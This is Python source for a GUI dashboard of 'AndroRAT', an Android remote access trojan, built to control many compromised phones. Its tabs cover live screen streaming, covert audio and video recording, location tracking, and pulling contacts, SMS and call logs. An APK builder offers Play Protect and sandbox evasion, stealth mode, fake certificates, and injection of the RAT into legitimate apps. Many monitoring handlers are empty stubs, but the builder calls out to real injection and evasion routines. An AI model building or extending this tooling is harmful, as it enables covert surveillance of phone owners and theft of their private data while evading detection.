#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
AndroRAT Advanced GUI - Multi-Client Dashboard
Modern interface for managing multiple Android clients with real-time monitoring
"""

import tkinter as tk
from tkinter import ttk, messagebox, filedialog, scrolledtext
import threading
import queue
import sys
import os
import platform
import subprocess
import json
import time
from datetime import datetime
from utils import *

class AdvancedAndroRATGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("AndroRAT Advanced - Multi-Client Dashboard")
        self.root.geometry("1200x800")
        self.root.minsize(1000, 700)
        
        # Configure styles for modern look
        self.setup_styles()
        
        # Data structures for client management
        self.connected_clients = {}
        self.client_data = {}
        self.message_queue = queue.Queue()
        
        # Variables
        self.setup_variables()
        
        # Create main interface
        self.create_main_interface()
        
        # Start background processes
        self.start_background_tasks()
        
    def setup_styles(self):
        """Configure modern styles for the GUI"""
        style = ttk.Style()
        
        # Try to use a modern theme
        available_themes = style.theme_names()
        if 'clam' in available_themes:
            style.theme_use('clam')
        elif 'vista' in available_themes:
            style.theme_use('vista')
            
        # Configure custom styles
        style.configure('Title.TLabel', font=('TkDefaultFont', 16, 'bold'))
        style.configure('Subtitle.TLabel', font=('TkDefaultFont', 10))
        style.configure('Status.TLabel', font=('TkDefaultFont', 9))
        style.configure('Client.Treeview', font=('TkDefaultFont', 9))
        
        # Custom colors
        style.configure('Online.TLabel', foreground='green')
        style.configure('Offline.TLabel', foreground='red')
        style.configure('Warning.TLabel', foreground='orange')
        
    def setup_variables(self):
        """Initialize GUI variables"""
        self.server_status = tk.StringVar(value="Stopped")
        self.client_count = tk.StringVar(value="0")
        self.selected_client = tk.StringVar(value="")
        self.server_port = tk.StringVar(value="8000")
        self.log_level = tk.StringVar(value="INFO")
        
    def create_main_interface(self):
        """Create the main GUI interface"""
        # Create main container
        main_container = ttk.Frame(self.root)
        main_container.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Create top toolbar
        self.create_toolbar(main_container)
        
        # Create main content area with paned window
        paned_window = ttk.PanedWindow(main_container, orient=tk.HORIZONTAL)
        paned_window.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
        # Left panel - Client list and controls
        left_panel = ttk.Frame(paned_window)
        paned_window.add(left_panel, weight=1)
        
        # Right panel - Client details and actions
        right_panel = ttk.Frame(paned_window)
        paned_window.add(right_panel, weight=2)
        
        # Create left panel contents
        self.create_client_list_panel(left_panel)
        
        # Create right panel contents
        self.create_client_details_panel(right_panel)
        
        # Create bottom status bar
        self.create_status_bar(main_container)
        
    def create_toolbar(self, parent):
        """Create top toolbar with server controls"""
        toolbar_frame = ttk.Frame(parent)
        toolbar_frame.pack(fill=tk.X, pady=(0, 10))
        
        # Title section
        title_frame = ttk.Frame(toolbar_frame)
        title_frame.pack(side=tk.LEFT, fill=tk.X, expand=True)
        
        title_label = ttk.Label(title_frame, text="AndroRAT Advanced Dashboard", 
                               style='Title.TLabel')
        title_label.pack(side=tk.LEFT)
        
        subtitle_label = ttk.Label(title_frame, 
                                  text="Multi-client remote administration platform",
                                  style='Subtitle.TLabel')
        subtitle_label.pack(side=tk.LEFT, padx=(10, 0))
        
        # Server controls section
        controls_frame = ttk.Frame(toolbar_frame)
        controls_frame.pack(side=tk.RIGHT)
        
        # Server status
        ttk.Label(controls_frame, text="Server:").pack(side=tk.LEFT, padx=(0, 5))
        
        status_label = ttk.Label(controls_frame, textvariable=self.server_status,
                                style='Status.TLabel')
        status_label.pack(side=tk.LEFT, padx=(0, 10))
        
        # Port entry
        ttk.Label(controls_frame, text="Port:").pack(side=tk.LEFT, padx=(0, 5))
        port_entry = ttk.Entry(controls_frame, textvariable=self.server_port, width=8)
        port_entry.pack(side=tk.LEFT, padx=(0, 10))
        
        # Control buttons
        self.start_button = ttk.Button(controls_frame, text="Start Server",
                                      command=self.start_server)
        self.start_button.pack(side=tk.LEFT, padx=(0, 5))
        
        self.stop_button = ttk.Button(controls_frame, text="Stop Server",
                                     command=self.stop_server, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT, padx=(0, 5))
        
        # APK Builder button
        ttk.Button(controls_frame, text="Build APK",
                  command=self.open_apk_builder).pack(side=tk.LEFT, padx=(5, 0))
        
    def create_client_list_panel(self, parent):
        """Create client list and management panel"""
        # Client list header
        header_frame = ttk.Frame(parent)
        header_frame.pack(fill=tk.X, pady=(0, 10))
        
        ttk.Label(header_frame, text="Connected Clients", 
                 font=('TkDefaultFont', 12, 'bold')).pack(side=tk.LEFT)
        
        client_count_label = ttk.Label(header_frame, textvariable=self.client_count,
                                      foreground='blue')
        client_count_label.pack(side=tk.RIGHT)
        
        # Client list treeview
        list_frame = ttk.Frame(parent)
        list_frame.pack(fill=tk.BOTH, expand=True)
        
        # Create treeview with columns
        columns = ('Device', 'Status', 'IP', 'Location', 'Connected')
        self.client_tree = ttk.Treeview(list_frame, columns=columns, show='headings',
                                       style='Client.Treeview')
        
        # Configure columns
        self.client_tree.heading('Device', text='Device')
        self.client_tree.heading('Status', text='Status')
        self.client_tree.heading('IP', text='IP Address')
        self.client_tree.heading('Location', text='Location')
        self.client_tree.heading('Connected', text='Connected')
        
        self.client_tree.column('Device', width=150)
        self.client_tree.column('Status', width=80)
        self.client_tree.column('IP', width=120)
        self.client_tree.column('Location', width=100)
        self.client_tree.column('Connected', width=100)
        
        # Add scrollbar
        scrollbar = ttk.Scrollbar(list_frame, orient=tk.VERTICAL, 
                                 command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=scrollbar.set)
        
        # Pack treeview and scrollbar
        self.client_tree.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        
        # Bind selection event
        self.client_tree.bind('<<TreeviewSelect>>', self.on_client_select)
        
        # Client action buttons
        action_frame = ttk.Frame(parent)
        action_frame.pack(fill=tk.X, pady=(10, 0))
        
        ttk.Button(action_frame, text="Refresh List",
                  command=self.refresh_client_list).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(action_frame, text="Disconnect Client",
                  command=self.disconnect_selected_client).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(action_frame, text="Send Command",
                  command=self.open_command_dialog).pack(side=tk.LEFT)
        
    def create_client_details_panel(self, parent):
        """Create client details and action panel"""
        # Create notebook for different sections
        self.details_notebook = ttk.Notebook(parent)
        self.details_notebook.pack(fill=tk.BOTH, expand=True)
        
        # Device Information tab
        self.create_device_info_tab()
        
        # File Manager tab
        self.create_file_manager_tab()
        
        # Real-time Monitoring tab
        self.create_monitoring_tab()
        
        # Data Viewers tab
        self.create_data_viewers_tab()
        
        # Command Console tab
        self.create_command_console_tab()
        
    def create_device_info_tab(self):
        """Create device information tab"""
        device_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(device_frame, text="Device Info")
        
        # Device info display
        info_frame = ttk.LabelFrame(device_frame, text="Device Details", padding=10)
        info_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.device_info_text = scrolledtext.ScrolledText(info_frame, height=15,
                                                          wrap=tk.WORD, state=tk.DISABLED)
        self.device_info_text.pack(fill=tk.BOTH, expand=True)
        
        # Control buttons
        button_frame = ttk.Frame(device_frame)
        button_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Button(button_frame, text="Get Device Info",
                  command=self.get_device_info).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(button_frame, text="Get Location",
                  command=self.get_location).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(button_frame, text="Vibrate Device",
                  command=self.vibrate_device).pack(side=tk.LEFT)
        
    def create_file_manager_tab(self):
        """Create file manager tab"""
        file_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(file_frame, text="File Manager")
        
        # Create dual-pane file manager
        paned = ttk.PanedWindow(file_frame, orient=tk.HORIZONTAL)
        paned.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Local files pane
        local_frame = ttk.LabelFrame(paned, text="Local Files", padding=5)
        paned.add(local_frame, weight=1)
        
        self.local_file_tree = ttk.Treeview(local_frame, height=15)
        self.local_file_tree.pack(fill=tk.BOTH, expand=True)
        
        # Remote files pane
        remote_frame = ttk.LabelFrame(paned, text="Remote Files", padding=5)
        paned.add(remote_frame, weight=1)
        
        self.remote_file_tree = ttk.Treeview(remote_frame, height=15)
        self.remote_file_tree.pack(fill=tk.BOTH, expand=True)
        
        # File operation buttons
        file_buttons_frame = ttk.Frame(file_frame)
        file_buttons_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Button(file_buttons_frame, text="Upload File",
                  command=self.upload_file).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(file_buttons_frame, text="Download File",
                  command=self.download_file).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(file_buttons_frame, text="Delete File",
                  command=self.delete_file).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(file_buttons_frame, text="Refresh Remote",
                  command=self.refresh_remote_files).pack(side=tk.LEFT)
        
    def create_monitoring_tab(self):
        """Create real-time monitoring tab"""
        monitor_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(monitor_frame, text="Live Monitor")
        
        # Screen monitoring section
        screen_frame = ttk.LabelFrame(monitor_frame, text="Screen Monitoring", padding=10)
        screen_frame.pack(fill=tk.X, padx=10, pady=(10, 5))
        
        screen_buttons_frame = ttk.Frame(screen_frame)
        screen_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(screen_buttons_frame, text="Start Screen Stream",
                  command=self.start_screen_stream).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(screen_buttons_frame, text="Take Screenshot",
                  command=self.take_screenshot).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(screen_buttons_frame, text="Stop Stream",
                  command=self.stop_screen_stream).pack(side=tk.LEFT)
        
        # Audio/Video monitoring section
        av_frame = ttk.LabelFrame(monitor_frame, text="Audio/Video Monitoring", padding=10)
        av_frame.pack(fill=tk.X, padx=10, pady=5)
        
        av_buttons_frame = ttk.Frame(av_frame)
        av_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(av_buttons_frame, text="Start Audio Recording",
                  command=self.start_audio_recording).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(av_buttons_frame, text="Start Video Recording",
                  command=self.start_video_recording).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(av_buttons_frame, text="Take Photo",
                  command=self.take_photo).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(av_buttons_frame, text="Stop Recording",
                  command=self.stop_recording).pack(side=tk.LEFT)
        
        # Location monitoring section
        location_frame = ttk.LabelFrame(monitor_frame, text="Location Tracking", padding=10)
        location_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(5, 10))
        
        location_buttons_frame = ttk.Frame(location_frame)
        location_buttons_frame.pack(fill=tk.X)
        
        ttk.Button(location_buttons_frame, text="Get Current Location",
                  command=self.get_current_location).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(location_buttons_frame, text="Start Location Tracking",
                  command=self.start_location_tracking).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(location_buttons_frame, text="View on Map",
                  command=self.view_location_map).pack(side=tk.LEFT)
        
        # Location display area
        self.location_text = scrolledtext.ScrolledText(location_frame, height=8,
                                                      wrap=tk.WORD, state=tk.DISABLED)
        self.location_text.pack(fill=tk.BOTH, expand=True, pady=(10, 0))
        
    def create_data_viewers_tab(self):
        """Create data viewers tab"""
        data_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(data_frame, text="Data Viewers")
        
        # Create sub-notebook for different data types
        data_notebook = ttk.Notebook(data_frame)
        data_notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Contacts viewer
        contacts_frame = ttk.Frame(data_notebook)
        data_notebook.add(contacts_frame, text="Contacts")
        
        self.contacts_tree = ttk.Treeview(contacts_frame, 
                                         columns=('Name', 'Phone', 'Email'),
                                         show='headings')
        self.contacts_tree.heading('Name', text='Name')
        self.contacts_tree.heading('Phone', text='Phone')
        self.contacts_tree.heading('Email', text='Email')
        self.contacts_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # SMS viewer
        sms_frame = ttk.Frame(data_notebook)
        data_notebook.add(sms_frame, text="SMS")
        
        self.sms_tree = ttk.Treeview(sms_frame,
                                    columns=('From', 'Message', 'Date'),
                                    show='headings')
        self.sms_tree.heading('From', text='From')
        self.sms_tree.heading('Message', text='Message')
        self.sms_tree.heading('Date', text='Date')
        self.sms_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Call logs viewer
        calls_frame = ttk.Frame(data_notebook)
        data_notebook.add(calls_frame, text="Call Logs")
        
        self.calls_tree = ttk.Treeview(calls_frame,
                                      columns=('Number', 'Duration', 'Type', 'Date'),
                                      show='headings')
        self.calls_tree.heading('Number', text='Number')
        self.calls_tree.heading('Duration', text='Duration')
        self.calls_tree.heading('Type', text='Type')
        self.calls_tree.heading('Date', text='Date')
        self.calls_tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        # Data action buttons
        data_buttons_frame = ttk.Frame(data_frame)
        data_buttons_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Button(data_buttons_frame, text="Load Contacts",
                  command=self.load_contacts).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(data_buttons_frame, text="Load SMS",
                  command=self.load_sms).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(data_buttons_frame, text="Load Call Logs",
                  command=self.load_call_logs).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(data_buttons_frame, text="Export Data",
                  command=self.export_data).pack(side=tk.LEFT)
        
    def create_command_console_tab(self):
        """Create command console tab"""
        console_frame = ttk.Frame(self.details_notebook)
        self.details_notebook.add(console_frame, text="Console")
        
        # Command output area
        output_frame = ttk.LabelFrame(console_frame, text="Command Output", padding=5)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=(10, 5))
        
        self.console_output = scrolledtext.ScrolledText(output_frame, height=20,
                                                       wrap=tk.WORD, state=tk.DISABLED,
                                                       font=('Courier', 9))
        self.console_output.pack(fill=tk.BOTH, expand=True)
        
        # Command input area
        input_frame = ttk.Frame(console_frame)
        input_frame.pack(fill=tk.X, padx=10, pady=(0, 10))
        
        ttk.Label(input_frame, text="Command:").pack(side=tk.LEFT, padx=(0, 5))
        
        self.command_entry = ttk.Entry(input_frame)
        self.command_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=(0, 5))
        self.command_entry.bind('<Return>', self.send_command)
        
        ttk.Button(input_frame, text="Send",
                  command=self.send_command).pack(side=tk.LEFT, padx=(0, 5))
        
        ttk.Button(input_frame, text="Clear",
                  command=self.clear_console).pack(side=tk.LEFT)
        
    def create_status_bar(self, parent):
        """Create bottom status bar"""
        status_frame = ttk.Frame(parent)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM, pady=(10, 0))
        
        # Left side - general status
        self.status_text = tk.StringVar(value="Ready")
        status_label = ttk.Label(status_frame, textvariable=self.status_text)
        status_label.pack(side=tk.LEFT)
        
        # Right side - time and system info
        time_label = ttk.Label(status_frame, text=f"System: {platform.system()}")
        time_label.pack(side=tk.RIGHT)
        
    # Event handlers and functionality methods
    
    def start_server(self):
        """Start the AndroRAT server"""
        try:
            port = self.server_port.get()
            self.status_text.set(f"Starting server on port {port}...")
            
            # Start server in background thread
            threading.Thread(target=self._start_server_thread, 
                           args=(port,), daemon=True).start()
            
            self.start_button.config(state=tk.DISABLED)
            self.stop_button.config(state=tk.NORMAL)
            self.server_status.set("Starting...")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {e}")
            
    def stop_server(self):
        """Stop the AndroRAT server"""
        try:
            self.status_text.set("Stopping server...")
            
            # Stop server logic here
            
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)
            self.server_status.set("Stopped")
            self.status_text.set("Server stopped")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to stop server: {e}")
            
    def _start_server_thread(self, port):
        """Server thread implementation"""
        try:
            # Server implementation would go here
            # For now, just simulate server starting
            time.sleep(2)
            self.server_status.set("Running")
            self.status_text.set(f"Server running on port {port}")
            
        except Exception as e:
            self.status_text.set(f"Server error: {e}")
            
    def on_client_select(self, event):
        """Handle client selection"""
        selection = self.client_tree.selection()
        if selection:
            client_id = selection[0]
            self.selected_client.set(client_id)
            # Load client details
            self.load_client_details(client_id)
            
    def load_client_details(self, client_id):
        """Load details for selected client"""
        # Implementation for loading client details
        pass
        
    def refresh_client_list(self):
        """Refresh the client list"""
        # Clear current list
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
            
        # Add sample clients for demonstration
        sample_clients = [
            ("client_1", "Samsung Galaxy S21", "Online", "192.168.1.100", "New York", "10:30 AM"),
            ("client_2", "OnePlus 9", "Offline", "192.168.1.101", "London", "2 hours ago"),
            ("client_3", "Pixel 6", "Online", "192.168.1.102", "Tokyo", "5:45 PM"),
        ]
        
        for client_id, device, status, ip, location, connected in sample_clients:
            self.client_tree.insert('', 'end', iid=client_id,
                                   values=(device, status, ip, location, connected))
            
        self.client_count.set(str(len(sample_clients)))
        
    def open_apk_builder(self):
        """Open enhanced APK builder dialog with all features"""
        # Create APK builder window
        apk_window = tk.Toplevel(self.root)
        apk_window.title("Advanced APK Builder")
        apk_window.geometry("700x800")
        apk_window.transient(self.root)
        apk_window.grab_set()
        
        # Make window scrollable
        canvas = tk.Canvas(apk_window)
        scrollbar = ttk.Scrollbar(apk_window, orient="vertical", command=canvas.yview)
        scrollable_frame = ttk.Frame(canvas)
        
        scrollable_frame.bind(
            "<Configure>",
            lambda e: canvas.configure(scrollregion=canvas.bbox("all"))
        )
        
        canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        
        # APK builder content
        title_frame = ttk.Frame(scrollable_frame)
        title_frame.pack(fill=tk.X, padx=20, pady=10)
        
        ttk.Label(title_frame, text="🚀 Advanced APK Builder", 
                 font=('TkDefaultFont', 16, 'bold')).pack()
        ttk.Label(title_frame, text="Build APKs with advanced evasion and injection features", 
                 font=('TkDefaultFont', 10)).pack()
        
        # Configuration frame
        config_frame = ttk.LabelFrame(scrollable_frame, text="Basic Configuration", padding=15)
        config_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # IP and Port
        ttk.Label(config_frame, text="Server IP:").grid(row=0, column=0, sticky='w', pady=5)
        self.apk_ip_var = tk.StringVar()
        ip_entry = ttk.Entry(config_frame, textvariable=self.apk_ip_var, width=25)
        ip_entry.grid(row=0, column=1, padx=(10, 0), pady=5, sticky='w')
        
        ttk.Label(config_frame, text="Server Port:").grid(row=1, column=0, sticky='w', pady=5)
        self.apk_port_var = tk.StringVar(value="8000")
        port_entry = ttk.Entry(config_frame, textvariable=self.apk_port_var, width=25)
        port_entry.grid(row=1, column=1, padx=(10, 0), pady=5, sticky='w')
        
        ttk.Label(config_frame, text="Output APK:").grid(row=2, column=0, sticky='w', pady=5)
        self.apk_output_var = tk.StringVar(value="enhanced_rat.apk")
        output_entry = ttk.Entry(config_frame, textvariable=self.apk_output_var, width=25)
        output_entry.grid(row=2, column=1, padx=(10, 0), pady=5, sticky='w')
        
        ttk.Button(config_frame, text="Browse", 
                  command=self.browse_apk_output).grid(row=2, column=2, padx=(5, 0), pady=5)
        
        # Basic Options
        basic_frame = ttk.LabelFrame(scrollable_frame, text="Basic Options", padding=15)
        basic_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.apk_icon_var = tk.BooleanVar()
        ttk.Checkbutton(basic_frame, text="🎯 Visible app icon after installation", 
                       variable=self.apk_icon_var).pack(anchor='w', pady=2)
        
        self.apk_tunnel_var = tk.BooleanVar()
        ttk.Checkbutton(basic_frame, text="🌐 Auto-configure tunnel (no manual IP needed)", 
                       variable=self.apk_tunnel_var, command=self.on_apk_tunnel_toggle).pack(anchor='w', pady=2)
        
        # Tunnel service selection
        tunnel_service_frame = ttk.Frame(basic_frame)
        tunnel_service_frame.pack(fill=tk.X, pady=5)
        
        ttk.Label(tunnel_service_frame, text="Tunnel Service:").pack(side=tk.LEFT)
        self.apk_tunnel_service_var = tk.StringVar(value="auto")
        tunnel_combo = ttk.Combobox(tunnel_service_frame, textvariable=self.apk_tunnel_service_var,
                                   values=["auto", "cloudflared", "serveo", "localtunnel", "ngrok"],
                                   state="readonly", width=15)
        tunnel_combo.pack(side=tk.LEFT, padx=(5, 0))
        
        # Advanced Evasion Options
        evasion_frame = ttk.LabelFrame(scrollable_frame, text="🛡️ Advanced Evasion Options", padding=15)
        evasion_frame.pack(fill=tk.X, padx=20, pady=10)
        
        # Create two columns for evasion options
        evasion_cols = ttk.Frame(evasion_frame)
        evasion_cols.pack(fill=tk.X)
        
        left_evasion = ttk.Frame(evasion_cols)
        left_evasion.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        right_evasion = ttk.Frame(evasion_cols)
        right_evasion.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        # Evasion variables
        self.apk_stealth_var = tk.BooleanVar()
        self.apk_anti_analysis_var = tk.BooleanVar()
        self.apk_play_protect_var = tk.BooleanVar()
        self.apk_obfuscation_var = tk.BooleanVar()
        self.apk_fake_certs_var = tk.BooleanVar()
        self.apk_random_package_var = tk.BooleanVar()
        
        # Left column evasion options
        ttk.Checkbutton(left_evasion, text="🛡️ Maximum Stealth Mode", 
                       variable=self.apk_stealth_var).pack(anchor='w', pady=2)
        ttk.Checkbutton(left_evasion, text="🔍 Anti-Analysis & Sandbox Evasion", 
                       variable=self.apk_anti_analysis_var).pack(anchor='w', pady=2)
        ttk.Checkbutton(left_evasion, text="🛡️ Play Protect Evasion", 
                       variable=self.apk_play_protect_var).pack(anchor='w', pady=2)
        
        # Right column evasion options
        ttk.Checkbutton(right_evasion, text="🔐 Advanced String Obfuscation", 
                       variable=self.apk_obfuscation_var).pack(anchor='w', pady=2)
        ttk.Checkbutton(right_evasion, text="📜 Fake Certificate Metadata", 
                       variable=self.apk_fake_certs_var).pack(anchor='w', pady=2)
        ttk.Checkbutton(right_evasion, text="📦 Random Package Name", 
                       variable=self.apk_random_package_var).pack(anchor='w', pady=2)
        
        # APK Injection Options
        injection_frame = ttk.LabelFrame(scrollable_frame, text="💉 APK Injection Mode", padding=15)
        injection_frame.pack(fill=tk.X, padx=20, pady=10)
        
        self.apk_inject_var = tk.BooleanVar()
        ttk.Checkbutton(injection_frame, text="💉 Inject into existing APK (preserves original functionality)", 
                       variable=self.apk_inject_var, command=self.on_apk_inject_toggle).pack(anchor='w', pady=5)
        
        # Target APK frame (initially hidden)
        self.apk_target_frame = ttk.Frame(injection_frame)
        
        ttk.Label(self.apk_target_frame, text="Target APK:").pack(side=tk.LEFT)
        self.apk_target_var = tk.StringVar()
        target_entry = ttk.Entry(self.apk_target_frame, textvariable=self.apk_target_var, width=35)
        target_entry.pack(side=tk.LEFT, padx=(5, 10))
        
        ttk.Button(self.apk_target_frame, text="Browse APK", 
                  command=self.browse_target_apk).pack(side=tk.LEFT)
        
        # Build buttons
        button_frame = ttk.Frame(scrollable_frame)
        button_frame.pack(fill=tk.X, padx=20, pady=20)
        
        ttk.Button(button_frame, text="🚀 Build APK", 
                  command=lambda: self.build_enhanced_apk(apk_window)).pack(side=tk.LEFT, padx=(0, 10))
        
        ttk.Button(button_frame, text="❌ Cancel", 
                  command=apk_window.destroy).pack(side=tk.LEFT)
        
        # Pack scrollable components
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        
    def on_apk_tunnel_toggle(self):
        """Handle APK builder tunnel toggle"""
        if self.apk_tunnel_var.get():
            self.apk_ip_var.set("(auto-configured by tunnel)")
        else:
            self.apk_ip_var.set("")
    
    def on_apk_inject_toggle(self):
        """Handle APK injection toggle"""
        if self.apk_inject_var.get():
            self.apk_target_frame.pack(fill=tk.X, pady=5)
        else:
            self.apk_target_frame.pack_forget()
            self.apk_target_var.set("")
    
    def browse_apk_output(self):
        """Browse for APK output location"""
        filename = filedialog.asksaveasfilename(
            title="Save APK as...",
            defaultextension=".apk",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
        )
        if filename:
            self.apk_output_var.set(os.path.basename(filename))
    
    def browse_target_apk(self):
        """Browse for target APK to inject into"""
        filename = filedialog.askopenfilename(
            title="Select target APK...",
            filetypes=[("APK files", "*.apk"), ("All files", "*.*")]
        )
        if filename:
            self.apk_target_var.set(filename)
    
    def build_enhanced_apk(self, window):
        """Build APK with enhanced features"""
        # Import validation functions
        from utils import is_valid_ip, is_valid_port, is_valid_filename, inject_rat_into_apk, build_with_evasion, build
        
        # Validate inputs
        if not self.apk_tunnel_var.get() and not self.apk_ip_var.get():
            messagebox.showerror("Error", "IP address required when not using tunneling")
            return
        
        if not self.apk_tunnel_var.get() and not is_valid_ip(self.apk_ip_var.get()):
            messagebox.showerror("Error", "Invalid IP address format")
            return
        
        if not self.apk_port_var.get():
            messagebox.showerror("Error", "Port is required")
            return
            
        if not is_valid_port(self.apk_port_var.get()):
            messagebox.showerror("Error", "Invalid port number")
            return
            
        if not self.apk_output_var.get():
            messagebox.showerror("Error", "Output filename is required")
            return
        
        if not is_valid_filename(self.apk_output_var.get()):
            # Auto-add .apk extension if missing
            filename = self.apk_output_var.get()
            if not filename.lower().endswith('.apk'):
                filename += '.apk'
                self.apk_output_var.set(filename)
        
        if self.apk_inject_var.get():
            if not self.apk_target_var.get():
                messagebox.showerror("Error", "Target APK required for injection mode")
                return
            if not os.path.exists(self.apk_target_var.get()):
                messagebox.showerror("Error", "Target APK file does not exist")
                return
        
        # Collect evasion options
        evasion_options = {
            'stealth': self.apk_stealth_var.get(),
            'anti_analysis': self.apk_anti_analysis_var.get(),
            'play_protect_evasion': self.apk_play_protect_var.get(),
            'advanced_obfuscation': self.apk_obfuscation_var.get(),
            'fake_certificates': self.apk_fake_certs_var.get(),
            'random_package': self.apk_random_package_var.get()
        }
        
        # Show build dialog
        build_info = "APK Build Started!\n\n"
        build_info += f"Output: {self.apk_output_var.get()}\n"
        build_info += f"IP: {self.apk_ip_var.get()}\n"
        build_info += f"Port: {self.apk_port_var.get()}\n"
        
        if any(evasion_options.values()):
            build_info += f"\nEvasion Features:\n"
            for option, enabled in evasion_options.items():
                if enabled:
                    build_info += f"✓ {option.replace('_', ' ').title()}\n"
        
        if self.apk_inject_var.get():
            build_info += f"\nInjection Mode:\n✓ Target: {os.path.basename(self.apk_target_var.get())}\n"
        
        build_info += "\nCheck console for detailed progress..."
        
        # Start build in background thread
        build_thread = threading.Thread(target=self._build_apk_thread, 
                                       args=(evasion_options,))
        build_thread.daemon = True
        build_thread.start()
        
        messagebox.showinfo("Enhanced APK Builder", build_info)
        window.destroy()
    
    def _build_apk_thread(self, evasion_options):
        """Background thread for APK building"""
        try:
            from utils import inject_rat_into_apk, build_with_evasion, build
            
            ip = self.apk_ip_var.get()
            port = self.apk_port_var.get()
            output = self.apk_output_var.get()
            icon = self.apk_icon_var.get()
            
            # Handle tunneling (simplified for advanced GUI)
            if self.apk_tunnel_var.get():
                ip = "127.0.0.1"  # Default for tunnel mode
            
            # Check if using injection mode
            if self.apk_inject_var.get():
                success = inject_rat_into_apk(
                    self.apk_target_var.get(),
                    ip,
                    port,
                    output,
                    evasion_options
                )
                
                if success:
                    self.message_queue.put(("success", f"APK injection completed: {output}"))
                else:
                    self.message_queue.put(("error", "APK injection failed"))
            else:
                # Check if using evasion
                if any(evasion_options.values()):
                    build_with_evasion(ip, port, output, False, None, icon, evasion_options)
                else:
                    build(ip, port, output, False, None, icon)
                
                self.message_queue.put(("success", f"APK built successfully: {output}"))
                
        except Exception as e:
            self.message_queue.put(("error", f"Build failed: {str(e)}"))
        
    def start_background_tasks(self):
        """Start background tasks for GUI updates"""
        # Start periodic updates
        self.update_gui()
        
    def update_gui(self):
        """Periodic GUI updates"""
        # Update time and status
        current_time = datetime.now().strftime("%H:%M:%S")
        
        # Schedule next update
        self.root.after(1000, self.update_gui)
        
    # Placeholder methods for functionality
    def disconnect_selected_client(self): pass
    def open_command_dialog(self): pass
    def get_device_info(self): pass
    def get_location(self): pass
    def vibrate_device(self): pass
    def upload_file(self): pass
    def download_file(self): pass
    def delete_file(self): pass
    def refresh_remote_files(self): pass
    def start_screen_stream(self): pass
    def take_screenshot(self): pass
    def stop_screen_stream(self): pass
    def start_audio_recording(self): pass
    def start_video_recording(self): pass
    def take_photo(self): pass
    def stop_recording(self): pass
    def get_current_location(self): pass
    def start_location_tracking(self): pass
    def view_location_map(self): pass
    def load_contacts(self): pass
    def load_sms(self): pass
    def load_call_logs(self): pass
    def export_data(self): pass
    def send_command(self, event=None): pass
    def clear_console(self): pass

def main():
    """Main function to run the advanced GUI"""
    # Check Python version
    if sys.version_info < (3, 6):
        print("Error: Python version should be 3.6 or higher")
        sys.exit(1)
        
    # Create and run GUI
    root = tk.Tk()
    app = AdvancedAndroRATGUI(root)
    
    try:
        root.mainloop()
    except KeyboardInterrupt:
        print("\nAdvanced GUI closed by user")
        sys.exit(0)

if __name__ == "__main__":
    main()